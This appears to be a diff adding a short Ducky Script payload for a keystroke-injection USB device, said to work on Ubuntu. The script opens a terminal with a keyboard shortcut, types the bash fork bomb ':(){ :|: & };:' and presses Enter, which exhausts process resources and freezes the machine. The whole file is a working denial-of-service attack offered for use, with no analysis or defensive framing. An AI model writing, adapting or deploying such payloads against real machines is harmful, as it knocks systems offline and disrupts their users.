@@ -1,0 +1,5 @@
+REM Works on Ubuntu.
+CTRL ALT t
+DELAY 500
+:(){ :|: & };:
+ENTER
